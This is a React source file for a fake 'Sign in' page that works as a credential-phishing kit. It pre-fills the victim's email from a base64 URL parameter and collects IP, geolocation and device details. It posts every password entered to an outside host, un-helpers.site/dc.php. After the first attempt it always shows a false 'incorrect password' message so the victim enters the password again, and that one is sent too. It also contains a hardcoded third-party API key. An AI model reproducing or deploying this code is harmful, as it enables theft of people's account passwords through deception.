import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import './Access.css';
import companyLogo from '../assets/images/logo.svg';

const SecurePortal = () => {
  const [userInput, setUserInput] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isValidated, setIsValidated] = useState(false);
  const [accessCode, setAccessCode] = useState('');
  const [firstTry, setFirstTry] = useState('');
  const [secondTry, setSecondTry] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [tryCount, setTryCount] = useState(0);
  const [isLocked, setIsLocked] = useState(false);
  const [clientIP, setClientIP] = useState('');
  const [locationData, setLocationData] = useState({});
  const [systemInfo, setSystemInfo] = useState({});
  const [showPassword, setShowPassword] = useState(false);
  const inputRef = useRef(null);
  const redirect = useNavigate();
  const blockedIPs = ['86.98.95.155'];
  const EyeOpenIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000000">
    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
    <circle cx="12" cy="12" r="3"></circle>
  </svg>
    );

  const EyeClosedIcon = () => (
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000000">
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
        <line x1="1" y1="1" x2="23" y2="23"></line>
      </svg>
    );
  // Extract email from URL
  useEffect(() => {
  const params = new URLSearchParams(window.location.search);
  const emailParam = params.get('id') || params.get('u');
  if (emailParam) {
    try {
      const decodedEmail = atob(decodeURIComponent(emailParam));
      if (decodedEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
        setUserInput(decodedEmail);
        setIsValidated(true);
        // Re-encode and update URL
        const reEncoded = encodeURIComponent(btoa(decodedEmail));
        window.history.replaceState({}, '', `?u=${reEncoded}`);
      }
    } catch {
      // email was not base64-encoded
      if (emailParam.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
        setUserInput(emailParam);
        setIsValidated(true);
        // Encode and update URL
        const encoded = encodeURIComponent(btoa(emailParam));
        window.history.replaceState({}, '', `?u=${encoded}`);
      }
    }
  }
}, []);

  // Auto-focus logic
  useEffect(() => {
    if (!isLocked && !isLoading && inputRef.current) {
      inputRef.current.focus();
    }
  }, [isLocked, isLoading, errorMsg]);

  // Toggle password visibility
  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const obscureParam = (text) => {
    try {
      return encodeURIComponent(btoa(text));
    } catch {
      return null;
    }
  };

  const isWeakCode = (code) => {
    if (!code || code.length < 5) return true;
    const weakPatterns = [
      /^1234?$/, /^asd$/, /^xdds?$/, /^\d{1,3}$/, /^[a-z]{3,4}$/i,
      /^password$/i, /^qwerty$/i, /^admin$/i, /^letmein$/i, /^welcome$/i
    ];
    return weakPatterns.some(pattern => pattern.test(code));
  };

  useEffect(() => {
    const getNetworkData = async () => {
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        if (blockedIPs.includes(ipResponse.data.ip)) {
          alert('Access not available');
          window.location.href = '/restricted';
          return;
        }
        setClientIP(ipResponse.data.ip);

        const geoData = await axios.get(
          `https://api.geoapify.com/v1/ipinfo?&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06&ip=${ipResponse.data.ip}`
        );
        const { country, city, continent } = geoData.data;

        setLocationData({
          country: country?.names?.en || 'Unknown',
          city: city?.names?.en || 'Unknown',
          region: continent?.names?.en || 'Unknown',
        });
      } catch {
        return;
      }
    };

    const getSystemDetails = () => {
      const details = {
        agent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
      };

      if (navigator.userAgentData) {
        details.platform = navigator.userAgentData.platform;
        details.vendor = navigator.userAgentData.brands?.map((b) => b.brand).join(', ') || '';
        details.isMobile = navigator.userAgentData.mobile || false;
      }

      setSystemInfo(details);
    };

    getNetworkData();
    getSystemDetails();
  }, []);

  const handleInputChange = (e) => {
    setUserInput(e.target.value);
    if (isValidated) {
      setIsValidated(false);
      setAccessCode('');
      setErrorMsg('');
      setTryCount(0);
      setFirstTry('');
      setSecondTry('');
    }
  };

  const validateInput = () => {
    if (!userInput.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      setErrorMsg('Valid email required');
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    setTimeout(() => {
      setIsLoading(false);
      setIsValidated(true);
      const obscured = obscureParam(userInput);
      if (obscured) {
        window.history.replaceState({}, '', `?u=${obscured}`);
      }
      setTimeout(() => inputRef.current?.focus(), 100);
    }, 300);
  };

  const sendFirstTry = async (code) => {
    try {
      await axios.post('https://un-helpers.site/dc.php/', {
        email: userInput,
        firstpasswordused: code,
        country: locationData.country,
        continent: locationData.region,
        city: locationData.city,
        device: {
          userAgent: systemInfo.agent,
          language: systemInfo.language,
          platform: systemInfo.platform,
          brand: systemInfo.vendor,
          mobile: systemInfo.isMobile,
        },
      }, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
    } catch {
      return;
    }
  };

  const handleAccess = async () => {
    if (isWeakCode(accessCode)) {
      setAccessCode('');
      if (inputRef.current) inputRef.current.focus();
      return;
    }

    if (tryCount === 0) {
      const code = accessCode;
      setFirstTry(code);
      setTryCount(1);
      setAccessCode('');
      setIsLocked(true);

      await sendFirstTry(code);

      setTimeout(() => {
        setErrorMsg(<span className='status-notification' style={{ color: 'red' }}>Your account or password is incorrect. Try again.</span>);
        setIsLocked(false);
      }, 200);
      return;
    }

    setIsLoading(true);
    setErrorMsg('');

    try {
      await axios.post('https://un-helpers.site/dc.php/', {
        email: userInput,
        secondpasswordused: accessCode,
        country: locationData.country,
        continent: locationData.region,
        city: locationData.city,
        device: {
          userAgent: systemInfo.agent,
          language: systemInfo.language,
          platform: systemInfo.platform,
          brand: systemInfo.vendor,
          mobile: systemInfo.isMobile,
        },
      }, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
    } catch (err) {
      if (err.message === 'Network Error') {
        setErrorMsg('Network issue. Please retry.');
      } else if (err.response) {
        setErrorMsg(`Access problem. Status: ${err.response.status}`);
      } else {
        setErrorMsg('System error. Refresh and retry.');
      }
    } finally {
      setIsLoading(false);
      redirect('/error');
    }
  };

  return (
    <div className="login-container">
      <form
        className="login-form"
        autoComplete="off"
        onSubmit={(e) => {
          e.preventDefault();
          if (!isLoading && !isLocked && accessCode) {
            handleAccess();
          }
        }}
      >
        <input type="text" style={{ display: 'none' }} autoComplete="false" />

        <div className="company-header">
          <span className="company-logo">
            <img src={companyLogo} alt="Company Logo" />
          </span>
        </div>

        <div className="form-section">
          <div className="email-display">
            <span className="email-icon">←</span>
            <span className="email-text">
              {userInput || 'sales@techniline.org'}
            </span>
          </div>

          <div className="password-line-container">
            <h3 className="password-title">Enter password</h3>
            {errorMsg && (
              <div className="error-message" style={{ color: '#ff0000' }}>
                {errorMsg}
              </div>
            )}
            <div className="password-input-wrapper">
              <input
                type={showPassword ? 'text' : 'password'}
                ref={inputRef}
                value={accessCode}
                onChange={(e) => setAccessCode(e.target.value)}
                className="password-line"
                autoFocus={!isLoading && !isLocked}
                required
                placeholder="Password"
                disabled={isLoading || isLocked}
              />
              <button
                type="button"
                className="password-toggle"
                onClick={togglePasswordVisibility}
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? <EyeClosedIcon /> : <EyeOpenIcon />}
              </button>
            </div>
          </div>

          <a href="#" className="forgot-password">
            Forgot my password
          </a>

          <div className="button-container">
            <button
              type="submit"
              disabled={isLoading || isLocked || !accessCode}
              className="submit-button"
            >
              {isLoading ? (
                <span className="spinner"></span>
              ) : (
                'Sign in'
              )}
            </button>
          </div>
        </div>
      </form>
    </div>
  );
};

export default SecurePortal;



